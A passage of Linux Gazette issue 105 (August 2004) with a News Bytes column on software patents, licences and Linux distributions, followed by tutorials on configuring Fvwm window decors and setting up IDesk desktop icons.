        of <I>Linux Gazette</I>
<br><a href="http://linuxgazette.net/copying.html"
        >Copyright &copy;</a> its authors, 2004
<BR>Published in issue 105 of <I>Linux Gazette</I> August 2004</H5>
<H6 ALIGN="center">HTML script maintained by
        <A HREF="mailto:star@starshine.org">Heather Stern</a> of
        Starshine Technical Services,
       <A HREF="http://www.starshine.org/">http://www.starshine.org/</A>
</H6>
</div>
<!-- end: articlecontent -->
</div>
<!--startcut ======================================================= -->
</BODY></HTML>
<!--endcut ========================================================= -->

</p>



<!-- *** BEGIN author bio *** -->
<!-- *** END author bio *** -->




<div id="articlefooter">




<p>
Published in Issue 105 of Linux Gazette, August 2004
</p>

</div>

</div>


<div class="content lgcontent">

<a name="lg_bytes"></a>
<h1>News Bytes</h1>
<p id="by"><b>By <A HREF="../authors/conry.html">Michael Conry</A></b></p>


</b>
</p>


<p>
<p>
</p><center>
<table cellpadding="7"><tbody><tr><td>
<img src="../gx/bytes.gif" border="1" alt="News Bytes">
</td><td>
<h3>Contents:</h3>
<ul>
<li><a href="#leg">Legislation and More Legislation</a>
<li><a href="#links">Linux Links</a>
</li><li><a href="#general">News in General</a>
</li><li><a href="#distro">Distro News</a>
</li><li><a href="#commercial">Software and Product News</a>
</li></ul>
</td></tr></tbody></table>

<strong>Selected and formatted by <a href="mailto:&#109;&#105;&#99;&#104;&#97;&#101;&#108;&#46;&#99;&#111;&#110;&#114;&#121;&#64;&#115;&#111;&#102;&#116;&#104;&#111;&#109;&#101;&#46;&#110;&#101;&#116;">Michael Conry</a></strong>
</center>


<p> Submitters, send your News Bytes items in 
<font size="+2"><strong>PLAIN TEXT</strong></font>
format.  Other formats may be rejected without reading.  You have been
warned!  A one- or two-paragraph summary plus URL gets you a better
announcement than an entire press release. Submit items to
<a href="mailto:&#98;&#121;&#116;&#101;&#115;&#64;&#108;&#105;&#110;&#117;&#120;&#103;&#97;&#122;&#101;&#116;&#116;&#101;&#46;&#110;&#101;&#116;">&#98;&#121;&#116;&#101;&#115;&#64;&#108;&#105;&#110;&#117;&#120;&#103;&#97;&#122;&#101;&#116;&#116;&#101;&#46;&#110;&#101;&#116;</a>

<BR CLEAR="all">




<div id="content" lang="en" dir="ltr">

<p><hr><p>
<a name="leg"></a>
<!-- ========== -->
<center><h3><font color="green">Legislation and More Legislation</font></h3></center>
<!-- ========= -->
<P><hr><P> <h3><img alt=" " src="../gx/bolt.gif"> 
<font color="green">Patents</font> </h3>
<p>
The subject of software patents has been a frequent topic of discussion
in this and other organs of the Free/Open-Source community.  An
indication of the problems that lie ahead if these issues are not
satisfactorily resolved is provided by the current discussions
surrounding Munich's migration from Windows to GNU/Linux.  In spite 
of much campaigning by Microsoft, including visits by Steve Ballmer,
the Munich authorities have been pursuing an Open Source IT strategy.
However, one pro-Open-Source Munich alderman has 
<a href="http://www.techweb.com/wire/story/TWB20040730S0001">pointed out
that ongoing doubts about the current and future status of
software patents could wreck the plans</a>.  Though his concerns are
largely precautionary, Jens Muehlhaus is not the only party to see the
importance of patents.
Microsoft, for one, certainly believes that patents are a crucial tool
with which to control the market.  To this end, over the past years the
company has 
<a href="http://news.com.com/Gates+wants+patent+power/2100-1014_3-5288722.html?part=rss&tag=5288722&subj=news.1014.5">
trebled the number of patents it files annually</a>.  Equally, there is
a growing awareness among the Free/Open-Source community of the issue,
<a href="http://www.newsforge.com/article.pl?sid=04/07/22/201217">
and of possible ways to confront the problem</a>.
While the American situation seems very hard to change (with 
<a href="http://www.newsforge.com/article.pl?sid=04/07/19/2251254">defensive
patenting being one of the more rational coping strategies</a>) the
European scenario is still 
<a href"http://www.iht.com/articles/528268.html">quite malleable</a>,
which hopefully will encourage some constructive engagement in this very
political process.


<!-- ========= -->
<P><hr><P> <h3><img alt=" " src="../gx/bolt.gif"> 
<font color="green">French Licence - CeCILL</font> </h3>
<p>
Three French public bodies, the ECA, the INRIA, and the CNRS, have
published a new 
<a href="http://www.inria.fr/valorisation/logiciels/Licence.CeCILL-V1.pdf">
free/open-source software licence: CeCILL</a>
[<a href="http://www.inria.fr/valorisation/logiciels/Licence.CeCILL-V1.US.pdf">
English translation</a>].
The new licence aims to address some specific 
<a href="http://www.theregister.co.uk/2004/07/12/open_source_license/">
points of French law</a> that the writers of CeCILL believe cause
difficulties in the application of the GPL.

<p><hr><p>
<a name="links"></a>
<!-- ========== -->
<center><h3><font color="green">Linux Links</font></h3></center>
<!-- ========= -->
<p>
<a
href="http://www.itmanagersjournal.com/article.pl?sid=04/07/21/226243">
Project AMOS aims to automate reuse of open source code</a> (a European
project aimed at creating a searchable database to automate the reuse of
free/open source software code).
</p>
<p>
<a href="http://www.iol.ie/~padraiga/cmdline.html">
Command line tips and trick</a>
</p>
<p>
E-Voting,
<a href="http://newsvac.newsforge.com/article.pl?sid=04/07/23/1639242">
a challenge to the Open Source community</a>
</p>
<p>
<a href="http://www.newsforge.com/article.pl?sid=04/07/12/1821241">
Mozilla and the future of the web</a>
</p>
<p>
<a href="http://www.linuxjournal.com/article.php?sid=7694">
Creating games with Pygame</a>
</p>
<p>
<a href="http://www.vnunet.com/news/1156903">
Sun moves away from Linux</a>
</p>
<p>
Analysing network attacks by
<a href"http://www.onlamp.com/pub/a/security/2004/07/22/intrusion_analysis.html">
sorting through packets from your IDS</a>.
</p>
<p>
<a href="http://www.onlamp.com/pub/a/onlamp/2004/05/06/writegreatcode.html">
Why to learn assembly language</a>
</p>
<p>
<a href="http://www.onlamp.com/pub/a/bsd/2004/07/08/dragonfly_bsd_interview.html">
Behind DragonFly BSD</a>,
a look at the new fork of FreeBSD 4.
</p>
<p>
<a href="http://newsvac.newsforge.com/article.pl?sid=04/07/19/1848250">
Who writes Linux</a>
</p>
<p>
<a href="http://www.newsforge.com/article.pl?sid=04/07/18/1937231">
Four alternative Linux window managers</a>, Newsforge takes a look at
life beyond KDE and Gnome:
AfterStep, Enlightenment, IceWM and FVWM.
</p>
<p>
<a href="http://www.osnews.com/story.php?news_id=7852">
Video production with Linux, Part II</a>
</p>
<p>
Real world
<a href="http://www.desktoplinux.com/news/NS7131779269.html">
Linux migration stories</a>
</p>
<p>
<a href="http://www.theregister.co.uk/2004/07/30/des_retirement_plans/">
DES to retire</a>
</p>

<p><hr><p>
<a name="general"></a>
<!-- ========== -->
<center><h3><font color="green">News in General</font></h3></center>
<!-- ========= -->
<!-- ========= --> 
<P><hr><P> <h3><img alt=" " src="../gx/bolt.gif"> 
<font color="green">Mandrake Storms French Government, Catalonia's Homage to CATix</font> </h3>
<p>
The French Ministry of Equipment has 
<a href="http://newsvac.newsforge.com/article.pl?sid=04/07/09/1550228">
chosen Mandrakelinux Corporate Server</a>
to replace 1,500 Microsoft Windows NT servers in a national scale
deployment.
<P>
In a similar trend, 
<a href="http://www.newsforge.com/article.pl?sid=04/07/23/2049248">Barcelona
city authorities have announced a plan</a> to
phase out current Windows&nbsp;NT installations in favour of 
<a href="http://www.tecnocampus.com/catix/">
CATix</a>, a GNU/Linux localisation in Catalan.

<p><hr><p>
<a name="distro"></a>
<!-- ========== -->
<center><h3><font color="green">Distro News</font></h3></center>

<!-- ========= -->
<P><hr><P> <h3><img alt=" " src="../gx/bolt.gif"> 
<font color="green">Conectiva</font> </h3>
<p>
<a href="http://www.conectiva.com.br/">
Conectiva Linux</a> has
<a href="http://newsvac.newsforge.com/article.pl?sid=04/07/07/1743240">
released version 10.0</a> 
of their GNU/Linux distribution.

<!-- ========= -->
<P><hr><P> <h3><img alt=" " src="../gx/bolt.gif"> 
<font color="green">Debian</font> </h3>
<p>
<a href="http://www.debian.org/News/weekly/2004/28/">
Debian Weekly News reports</a>
that
Debian is increasing it's market share. 
<a href="http://news.netcraft.com/archives/2004/07/12/slight_linux_market_share_loss_for_red_hat.html">
Netcraft has reported data</a>
indicating that
Debian shows market share gains among GNU/Linux distributions (Gentoo
currently has the fastest percentage growth rate). Debian
GNU/Linux is now running on more than 1 million web-facing hostnames.
 
 <!-- ========= -->
<P><hr><P> <h3><img alt=" " src="../gx/bolt.gif"> 
<font color="green">Feather</font> </h3>
<p>
<a href="http://featherlinux.berlios.de/">Feather Linux</a>
is a Knoppix-derived Linux distribution.  It can run completely off a CD
or a USB memory-key and uses less than 64Mb of space.  It provides a
selection of desktop-focused software.  LinuxQuestions.org has 
<a href="http://newsvac.newsforge.com/article.pl?sid=04/07/29/1657253">
recently added an officially recognized forum</a>
for the distribution

<!-- ========= -->
<P><hr><P> <h3><img alt=" " src="../gx/bolt.gif"> 
<font color="green">Mepis</font> </h3>
<p>
A (largely positive)
<a href="http://www.desktopos.com/reviews.php?op=showcontent&id=12">
review</a> of
<a href="http://www.mepis.org/">
Mepis Linux</a>

<P><hr><P> <h3><img alt=" " src="../gx/bolt.gif"> 
<font color="green">Progeny</font> </h3>
<p>
Progeny Debian 2.0, Developer Edition Beta 1
<a href="http://platform.progeny.com/archives/000039.html">
has been released</a>
and is available for download.  This release represents a sample
implementation of Componentized Linux.

<!-- ========= -->
<P><hr><P> <h3><img alt=" " src="../gx/bolt.gif"> 
<font color="green">Red Hat</font> </h3>
<p>
Red Hat is reported to 
<a href="http://newsvac.newsforge.com/article.pl?sid=04/07/30/2214237">
be preparing to sell a subscription service</a>
supporting an open-source Java application server.

<!-- ========= -->
<P><hr><P> <h3><img alt=" " src="../gx/bolt.gif"> 
<font color="green">Turbo</font> </h3>
<p>
Flexbeta has
<a href="http://www.flexbeta.net/main/articles.php?action=show&id=73">reviewed 
Turbo Linux 10f</a>, the multi-media geared variant of Turbo Linux 10.


<!-- ========= -->
<P><hr><P> <h3><img alt=" " src="../gx/bolt.gif"> 
<font color="green">Vidalinux</font> </h3>
<p>
<a href="http://desktop.vidalinux.com/index.php">Vidalinux</a>
has 
<a href="http://desktop.vidalinux.com/index.php?option=content&task=blogcategory&id=9&Itemid=28">
released Vidalinux Desktop OS beta2</a>,
which is based on the 2.6.7-gentoo-r11 kernel.



<p><hr><p>
<a name="commercial"></a>
<!-- ========== -->
<center><h3><font color="green">Software and Product News</font></h3></center>

<!-- ========= -->
<P><hr><P> <h3><img alt=" " src="../gx/bolt.gif">
<font color="green">PhoneGaim</font> </h3>
<p>
Linux vendor Linspire  
<a href="http://www.eweek.com/article2/0,1759,1624605,00.asp">has
released PhoneGaim</a>, a free software
program that adds voice-over-IP functionality to the Linux-based Gaim
instant messaging client.

<!-- ========= -->
<P><hr><P> <h3><img alt=" " src="../gx/bolt.gif">
<font color="green">Maguma</font> </h3>
<p>
<a href="http://maguma.com/products/?article=Workbench">Maguma
Workbench</a> is a cross-platform source-level editor, also known
as an IDE (Integrated Development Environment).  The product contains a
debugger, internal and external previews, adjustable themes, class
browser, new flexible layout, and more.  As well as Linux, the product
is available for Windows and Mac OSX.


<!-- ========= -->
<P><hr><P> <h3><img alt=" " src="../gx/bolt.gif">
<font color="green">Motorola's Linux Smart Phone</font> </h3>
<p>
LinuxDevices reports that US mobile phone customers 
<a href="http://www.linuxdevices.com/news/NS3567256959.html">
will soon have the opportunity to by  a Linux-based handset later this
year</a>,  when operators begin offering a 
Motorola Linux/Java smartphone aimed at business professionals. The A780
will roll out globally in early Q4, reaching select US regions before
2005, according to Motorola.

</div>



<!-- end -->


</p>



<!-- *** BEGIN author bio *** -->
	<hr>
<P> Mick is LG's News Bytes Editor.
<P>

<!-- *** BEGIN bio *** -->
<IMG ALIGN="LEFT" VALIGN="top" ALT="[Picture]" SRC="../gx/2002/tagbio/conry.jpg" WIDTH="128" HEIGHT="158" class="bio">
<em>
Originally hailing from Ireland, Michael is currently living in Baden,
Switzerland.  There he works with ABB Corporate Research as a
Marie-Curie fellow, developing software for the simulation and design
of electrical power-systems equipment.

<p> Before this, Michael worked as a lecturer in the Department of
Mechanical Engineering, University College Dublin; the same
institution that awarded him his PhD. The topic of this PhD research
was the use of Lamb waves in nondestructive testing. GNU/Linux has
been very useful in his past work, and Michael has a strong interest
in applying free software solutions to other problems in engineering.

</em>
<br CLEAR="all">
<!-- *** END bio *** -->

<!-- *** END author bio *** -->




<div id="articlefooter">



<p>
Copyright &copy; 2004, <A HREF="../authors/conry.html">Michael Conry</A>. Released under the
<a href="http://linuxgazette.net/copying.html">Open Publication license</a>
unless otherwise noted in the body of the article. Linux Gazette is not
produced, sponsored, or endorsed by its prior host, SSC, Inc.
</p>



<p>
Published in Issue 105 of Linux Gazette, August 2004
</p>

</div>

</div>


<div class="content lgcontent">

<a name="adam"></a>
<h1>Fvwm</h1>
<p id="by"><b>By <A HREF="../authors/adam.html">Thomas Adam</A></b></p>


</b>
</p>


<p>
<!-- start: Introduction -->
<h3>Introduction</h3>

<p><a href="http://www.fvwm.org">Fvwm</a>! I'm sure some of you remember it
quite well as a window manager of the days past - and you'd be forgiven for
thinking that it no longer existed. It is, perhaps, a shame that it has
been over-shadowed by the newer, glitzier desktop managers such as KDE and
GNOME, but I suppose that the times have changed. People are after more
eye-candy than even before - right?  Well, not me. While it may be true
that we all like pretty things, often these things come with a sacrifice.
The most noteworthy thing for me over the years has been that using KDE and
GNOME requires a supercomputer with tons of RAM, while Fvwm remains fast as
lighting on machines with even marginal resources. For those of us who wish
to get full usage out of our existing hardware instead of chasing the
ever-changing "latest and greatest" machinery with our hard-earned cash,
software such as Fvwm can be the factor that makes the key difference.</p>

<p>What separates a <em>window manager</em> from a <em>desktop
environment</em> is that the former does not have integrated applications
such as file managers and utilities to tweak the overall environment.
Instead, all such utilities are external - just as they should be. The job
of a window manager is just that; it manages windows.</p>

<p>Fvwm was <a href="http://www.fvwm.org/history.php">created</a> by Robert
Nation. It is based on code from 'twm' (Tom's Window Manager) which was at
the time perhaps the only real window manager available. Frustrated with
the lack of features and the fact that 'twm' was full of memory leaks, Rob
began hacking on it; the result was that Fvwm was kick-started in early
1993. Rob had, in fact, already made a name for himself as the author of
the popular terminal emulator <a
href="http://www.rxvt.org"target="_blank">rxvt</a>, which is still used by
a lot of people today.</p>

<p>What I intend to demonstrate here is how to start from a minimal
configuration of Fvwm and work upwards, discussing how Fvwm operates and
how to configure it to do various things. There is a lot to Fvwm, so this
won't be quick - but I hope it will be interesting nevertheless.</p>

<!-- end: introduction -->

<h3>Installation</h3>

<p>Since Fvwm has been bundled with every distribution that I have used,
chances that you have it anyway. You should not use Fvwm1, since this is
old and is no longer supported by the developers. Currently, the stable
version is <b>2.4.18</b> while the unstable version is <b>2.5.10</b>.
Unlike many classifications of stable/unstable, the unstable version of
Fvwm has never crashed for me, so I can recommend using it. Indeed, most of
what I will talk about over the next few months will rely on the features
in this version, and that are absent in the 'stable' version.</p>

<p>As a side note to using pre-compiled binaries, depending on the
distribution used, some features that I may mention might not be compiled
in. Therefore, if you want to have all the features that I'll be
discussing, you would be well advised to <a
href="ftp://ftp.fvwm.org/pub/fvwm/version-2/fvwm-2.5.10.tar.gz">download</a>
the unstable version and compile it. There's plenty of helpful information
in the README and INSTALL files.</p>

<h3>Features of Fvwm</h3>

<p>There are too many features to list, but as an overview of what Fvwm
provides, here are some of the more interesting ones:</p>

<ul>
  <li>Full Enhanced Window Manager Hints support</li>
  <li>Virtual Desktops</li>
  <li>Full internationalisation</li>
  <li>Greatly improved font support, including anti-aliasing</li>
  <li>Improved decoration code</li>
  <li>Side titles, including vertical text</li>
  <li>Powerful WindowShade in all directions, including diagonal</li>
  <li>PNG support, including alpha blending</li>
  <li>Image rendering in colorsets</li>
  <li>Perl library for creating modules in Perl</li>
  <li>New module FvwmPerl to enable scripting in rc files</li>
  <li>Optional text shadows (looks nice with light text)</li>
</ul>

<p>There is also <a href="../100/adam.html">session management</a> support
for those who want it.</p>

<!-- start: Starting Fvwm -->
<h3>Starting and Configuring Fvwm</h3>

<p>Fvwm's configuration is best done on a per-user basis, although a global
configuration is possible. When Fvwm loads, it looks for the following files
and will use the first one it finds:

<ul>
  <li>$HOME/.fvwm/config</li>
  <li>/usr/local/share/fvwm/config</li>
  <li>$HOME/.fvwm/.fvwm2rc</li>
  <li>$HOME/.fvwm2rc</li>
  <li>/usr/local/share/fvwm/.fvwm2rc</li>
  <li>/usr/local/share/fvwm/system.fvwm2rc</li>
  <li>/etc/system.fvwm2rc</li>
</ul>

<p>If no files are found, Fvwm loads with a default builtin menu. This can
initially be used to create a basic ~/.fvwm/.fvwm2rc file, as shown by figure
1.</p>

<center>
  <img src="misc/adam/fvwm-startup.png" alt="Fvwm startup" /><br />
  <b>Figure 1: Fallback mode that Fvwm uses if no config files were found.</b>
</center>

<p>You can then reload Fvwm, and you'll have a bare-minimum config file.
By default, Fvwm takes on the appearance of <em>mwm</em> and although mwm's
style can be emulated completely, Fvwm's own internal style is to have raised
borders and a raised title, as shown in figure 2.</p>

<center>
  <img src="misc/adam/fvwm-initial2.png" alt="Fvwm's initial config" /><br />
  <b>Figure 2: Screenshot of the settings produced after the generated
    config.</b>
</center>

<p>You may well be thinking <em>"yuck!"</em> - and I wouldn't blame you.
There are certain things about it that are hideous, I know. But everything
you see in the screenshot is configurable. Of course, all actual window
management features are supported; there are menus, button bars, etc. Let's
take a closer look at what makes up a window.</p>

<h3>A window is a window is a window</h3>

<p>A window is a decorated screen frame containing the graphical interface
of a program. There are several characteristics of a window, some of which
are obvious and some not so obvious, all of which allow us to configure the
window's appearance. The structure of a typical window usually contains the
following:</p>

<ul>
  <li>Title Bar</li>
  <li>Window Buttons</li>
  <li>Window Border</li>
</ul>

<p>A popular configuration is to have three buttons on the title bar. The
leftmost one when clicked, pulls down a menu of choice that can be applied
to the window. This is more or less the same as the decor in MS-Windows.
The next button after that (moving right) iconifies the window, while the
button next to that one maximises the window (as seen in Figure 3).</p>

<center>
  <img src="misc/adam/fvwm-window.png" alt="Sample Fvwm Window" /><br />
  <b>Figure 3: A decorated window using the default Fvwm settings.</b>
</center>

<p>Fvwm allows up to a maximum of ten buttons on the window titlebar. These
can be defined to perform a number of functions. I've yet to personally
think of a reason why you would need to define all ten, but I'm sure some
people do. There are two types of buttons that can be defined: <b>vector
buttons</b> and <b>pixmaps</b>, the former of which are used by default.
I'll come back to the difference later on, but for now we'll look at how
the buttons are arranged and seen by Fvwm. As such, each button is numbered
in turn.</p>


<center><pre>
+--------------------------------------------------------------------------+
| 1 3 5 7 9			   Title			 0 8 6 4 2 |
|--------------------------------------------------------------------------|
|									   |
</pre></center>

<p>Fig. 3 therefore shows that buttons 1,4 and 2 have been defined. I
mentioned vector buttons earlier. These are "drawn" by Fvwm. Essentially,
they're just coordinates of points used by Fvwm for specific functions. You
can see a huge list of vector definitions <a
href="http://www.fvwm.org/screenshots/vectorbuttons/"> here</a>. You can
also apply various definitions to the buttons as you see fit. The code for
the buttons is defined within a <i>decor</i>. By default (as is the case
here), if no decor has been defined, the builtin is used.</p>

<h4>Defining Decors</h4>

<p>A decor is a defined set of characteristics that can be applied to
windows. Typically, they're suited for defining all the attributes we've
looked at so far.</p>

<p><pre class=code>
AddToDecor   fDecor
 + BorderStyle Simple
 + TitleStyle	   -- Raised
 + ButtonStyle All -- Raised
 + AddButtonStyle 1 Vector 5 25x40@1 25x60@1 75x60@0 75x40@0 25x40@1
 + AddButtonStyle 2 Vector 4 50x25@1 75x75@0 25x75@0 50x25@1
 + AddButtonStyle 4 Vector 4 50x75@1 25x25@1 75x25@1 50x75@0
 + ButtonStyle	  1 - Clear MWMDecorMenu
 + ButtonStyle	  2 - Clear MWMDecorMax
 + ButtonStyle	  4 - Clear MWMDecorMin
</pre></p>

<p>This code can be placed in the <em>~/.fvwm/.fvwm2rc</em> file. This
decor does a number of things. <em>BorderStyle</em> sets up the style of
the border.  The <i>simple</i> option tells Fvwm that you want the
defaults. If you look closely at the border, you'll notice that the edges
are cut into. These are the window <em>handles</em> that define how much of
the edge is available for grabbing the window (to resize it, move it, etc.)
<em>TitleStyle</em> can set a number of attributes; here, it is being
used to give the tilebar a raised look, and the same is done to the buttons
with the <em>ButtonStyle</em> command. <em>AddButtonStyle</em> adds to an
existing style. Following that, the button number is specified (see
diagram), and last are the vector definitions that you can replace with your
own.</p>

<p>One aspect you must be aware of is that if you define a new button to be
added to the titlebar, you <b>must</b> give it a mouse-binding, otherwise it
will not display. I won't be covering mouse bindings just yet, but for now you
can locate the following in the <em>~/.fvwm/.fvwm2rc</em> file:</p>

<p><pre class=code>
#   for the title bar buttons:
Mouse 0 1       A       Menu MenuFvwmWindowOps2 Close
Mouse 0 2       A       FuncFvwmMaximize
Mouse 0 4       A       Iconify
</pre></p>

<p>Adding your own definition is simple. Although nothing will be bound to
the button, you can add below those definitions something like the
following, replacing the number after "0" with the corresponding number of
the button for which you have defined the vector:</p>

<p><pre class=code>
Mouse 0 0	A	Nop
</pre></p>

<p>You'll have to restart Fvwm for the changes to be applied.</p>

<p>There is a <b>huge</b> number of options available for just these
commands. For instance, you can define the Titlebar to be flat, by adding
the following line:</p>

<pre class=code>TitleStyle -- Flat</pre>

<p>If you add <i>--flat</i> to the end of your vector button definitions,
the button takes on a sunken, rather than raised, appearance. You can also
define button styles based on state, i.e. one for <em>ActiveUp</em> and
<em>ActiveDown</em>. Border styles can also be set, so that, rather than a
raised border, you can have <em>sunken</em> or <em>flat</em> ones.</p>

<p>As I mentioned earlier, pixmaps can also be used, in place of vector
buttons. The same rules apply about defining the mouse-bindings from earlier. 
These are .xpm files that you can define to replace the buttons with images of your 
own. The style is similar to the one just defined:</p>

<p><pre class=code>
ButtonStyle 2 Pixmap my_pixmap.xpm
ButtonStyle 4 \
  ActiveUp   (Pixmap activeup.xpm) \
  ActiveDown (Pixmap activedown.xpm) \
  Inactive   (Pixmap inactiveup.xpm)
  ButtonStyle 4 \
  InactiveDown Pixmap inactivedown.xpm
</pre></p>

<p>Here, Button 2 remains the same throughout all states, but Button 4 uses a
different pixmap depending on the state. The button states are listed
below:

<ul>
  <li><em>ActiveUp</em> -- This is the default used, if nothing else is set.
  It cannot be destroyed.</li>
  <li><em>ActiveDown</em> -- This is the state of the button when it is
  pressed in.</li>
  <li><em>InActive</em> -- This is used for windows that are focused and
  defocused (hence the <em>ActiveUp</em> state is used).</li>
  <li><em>InactiveDown</em> -- Used for button/title presses for
  non-focused windows.</li>
</ul>

<p> To apply the decor that you create, you have to tell Fvwm about it. The
following general line can be used, obviously replacing the name of the decor
with whatever you called it. In the examples above it is <i>fDecor</i>:</p>

<p><pre class=code>
Style *  UseDecor  fDecor
</pre></p>

<h3>Next Month...</h3>

<p>Obviously, this has been a cursory review of what a window is, and how
to define the basic decor such as buttons and borders. There is a plethora
of options that I have not covered just for these alone. Although somewhat
cumbersome, the man page for fvwm contains all of these, and includes a lot
of options in addition to what I have mentioned. Play around and experiment
with defining buttons and vectors.</p>

<p>Next month, we'll take a look at defining menus, coloursets for windows, 
and some other style options.</p>

<h3>Resources</h3>

<p>Here's a list of resources for more Fvwm-related information:</p>

<a href="http://www.fvwm.org">FVWM's official site</a><br />
<a href="http://www.twobarleycorns.net/fvwm-decors.html">Fvwm Decor
  collection</a><br />
<a href="http://fvwm-themes.sf.net">fvwm-themes site</a><br />
<a href="http://dev.gentoo.org/~taviso/fvwm2rc.html">An excellent and "modern"
  fvwm2rc file</a><br />
<a href="http://www.fvwm.org/screenshots/desktops/">Fvwm screenshots</a><br />
<a href="http://calmar.ws/fvwm/index.php">Calmar's site about Fvwm</a><br />
<a href="http://linuxmafia.com/~n6tadam/fvwm">My own config file with
  screenshots</a><br />

<p><code>man fvwm</code></p>


</p>



<!-- *** BEGIN author bio *** -->
	<!-- *** BEGIN bio *** -->
<hr>
<P>
<IMG ALT="picture" SRC="../gx/2003/authors/adam.jpg" WIDTH="240" HEIGHT="223" ALIGN="left"  HSPACE="10" VSPACE="10" class="bio">
<em>

I write the recently-revived series "The Linux Weekend Mechanic", which was
started by John Fisk (the founder of Linux Gazette) in 1996 and continued
until 1998.  I'm also a member of The Answer Gang.

<P> I was born in Hammersmith (London UK) in 1983.  When I was 13, I moved to
the sleepy, thatched roofed, village of East Chaldon in the county of Dorset.
I am very near the coast (at Lulworth Cove) which is where I used to work.

<P> I first got interested in Linux in 1996 having seen a review of it in a
magazine (Slackware 2.0). I was fed up with the instability that the then-new
operating system Win95 had and so I decided to give it a go.
Slackware 2.0 was great. I have been a massive Linux enthusiast ever
since.  I ended up with running SuSE on both my desktop and laptop computers.

<P> While at school (<A HREF="www.purbeck.dorset.sch.uk">The Purbeck
School</A>, Wareham in Dorset), I was actively involved in setting up two
Linux proxy servers (each running Squid and SquidGuard).  I also set up
numerous BASH scripts which allowed web-based filtering to be done via
e-mail, so that when an e-mail was received, the contents of it were added to
the filter file. (Good old BASH -- I love it)

<P> I am now 18 and studying at University (Southampton Institute, UK), on a
course called HND Business Information Technology (BIT). So far, it's great.

<P> Other hobbies include reading. I especially enjoy reading plays (Henrik
Ibsen, Chekhov, George Bernard Shaw), and I also enjoy literature (Edgar Allan
Poe, Charles Dickens, Jane Austin to name but a few).

<P> I enjoy walking, and often go on holiday to the Lake District, to a place
called Keswick. There are numerous "mountains", of which "Great Gable" is my
most favourite.

<P> I am also a keen musician. I play the piano in my spare time. 

<P> I listen to a variety of music. I enjoy listening to
Rock (My favourite band is "Pavement" (lead singer:
Stephen Malkmus). I also have a passion for 1960's
psychedelic music (I hope to purchase a copy of
"Nuggets" reeeeaaall soon).
</em>
<br CLEAR="all">
<!-- *** END bio *** -->


<!-- *** END author bio *** -->




<div id="articlefooter">



<p>
Copyright &copy; 2004, <A HREF="../authors/adam.html">Thomas Adam</A>. Released under the
<a href="http://linuxgazette.net/copying.html">Open Publication license</a>
unless otherwise noted in the body of the article. Linux Gazette is not
produced, sponsored, or endorsed by its prior host, SSC, Inc.
</p>



<p>
Published in Issue 105 of Linux Gazette, August 2004
</p>

</div>

</div>


<div class="content lgcontent">

<a name="murray"></a>
<h1>How To Enable Desktop Icons for Lightweight Window Managers</h1>
<p id="by"><b>By <A HREF="../authors/murray.html">John Murray</A></b></p>


</b>
</p>


<p>
<h3>About IDesk</h3>

<p>Despite the enormous popularity of GNOME and KDE, many
users elect to use lighter, simpler window managers instead of
the full-blown desktop environments. And with good reason; the
performance gains realised through using a fast, light
WM - IceWm, Blackbox or Windowmaker for example - are
often quite dramatic, especially on underpowered machines.

<p>Most of these lightweight window managers lack the ability to
display desktop icons, and for some people this isn't a problem.
Others however, might find this a bit hard to get used to,
especially if they've come from another desktop environment or OS
that <i>does</i> use icons, and this is where IDesk comes in -
it's a tool for managing icons on the root window.

<p>There are a few ways to get icons onto your desktop; you could
run <i>Nautilus</i> or <i>kdesktop</i> for example. There are
disadvantages with these tools though; apart from their appetite
for system resources they can take over your desktop and hijack
mouse-clicks from your WM. In contrast with these, IDesk is 
light on memory usage and does nothing but manage your icons, so
your WM will behave exactly as it should. And unlike some other
light weight tools, IDesk is neither plain nor ugly, and supports
eye-candy effects such as transparency. Here's the feature list
as described on the IDesk website:

<ul>
  <li>Execution of multiple shell commands
  <li>Completely configurable actions
  <li>PNG image support
  <li>SVG image support with image scaling
  <li>Xft anti-aliased fonts
  <li>Pseudo-transparency
  <li>Shadowed fonts
  <li>Snap to grid icon placement
  <li>Only show caption on mouse-over
  <li>Automatic background updating with Esetroot
</ul>

<p> If you think this sounds good, perhaps you should check out some <a
href= "http://idesk.sourceforge.net/site/screens.html">screenshots</a> to
see just how good a fast, lightweight desktop can look.

<h3>Getting and Installing IDesk</h3>

<p>You can download the source from <a href=
"http://idesk.sourceforge.net/site/download.html">the IDesk
site</a>, plus there are binary packages available in RPM and deb
formats. Installation for either format is straightforward.

<h3>Setup</h3>
<p>Before you can run IDesk, you need an .ideskrc file in your
home directory - you'll find a sample that you can copy and paste
in the /usr/share/doc/idesk/README file. This file can be edited
to customise IDesk's appearance and behaviour; the font and level
of transparency for example. Here's my .ideskrc as an
example:
<pre class="code">
table Config
  FontName: verdana
  FontSize: 12
  FontColor: #ffffff
  Locked: false
  Transparency: 0
  Shadow: true
  ShadowColor: #000000
  ShadowX: 1
  ShadowY: 2
  Bold: false
  ClickDelay: 200
  IconSnap: true
  SnapWidth: 55
  SnapHeight: 100
  SnapOrigin: BottomRight
  SnapShadow: true
  SnapShadowTrans: 200
  CaptionOnHover: false
end

table Actions
  Lock: control right doubleClk
  Reload: middle doubleClk
  Drag: left hold
  EndDrag: left singleClk
  Execute[0]: left doubleClk
  Execute[1]: right doubleClk
end
</pre>

<p>You'll also need a .idesktop folder in your home folder -
idesk uses a small text file (known as a linkfile) to represent
each icon, and these .lnk files live in this folder. Here's an
example:
  <br>
  <pre class="code">
table Icon
  Caption: Gnumeric
  Icon: /usr/share/idesk/icons/gnumeric.png
  X: 31
  Y: 442
  Command[0]: gnumeric
  Command[1]: gedit ~/.idesktop/gnumeric.lnk
end 
</pre>

<p>The Command[0] and Command[1] lines refer to the left-click
and right-click commands respectively. Don't worry about getting
the X and Y values right; you can simply drag the icons into
place and their positions will be remembered between
sessions.

<p>New users might also be interested in the <a href=
"http://users.netwit.net.au/~pursang/idesk-extras.html">idesk-extras</a>
package; it contains a set of png icons representing most common
apps and tasks, as well as sample .ideskrc and .lnk files.

<h3>Starting</h3>

<p>It's probably best that idesk is started for the first time
from a shell prompt, so that any error messages will be visible.
Once you're satisfied with the configuration, you can add the
<tt>idesk &amp;</tt> command to your window managers startup
script.

<h3>Quirks and Bugs</h3>

<p>Idesk is currently not being actively developed, and the
latest version available is 0.56. Despite being at a beta stage,
idesk has - for me at least - behaved perfectly, though others
have reported some bugs and there are a couple of minor quirks
to keep in mind. The first being that if you misconfigure one of
the .lnk files - say by using an invalid command or icon image
address - idesk will not start. In other words, even if only one
icon is misconfigured, none will be displayed. If this happens,
just try to restart idesk from a command line and the error
message will identify the fault.

<p>The other one is related to the way the icons are positioned;
they are "anchored" from the top left hand corner of the icon
image rather than the centre or the label. So long as all your
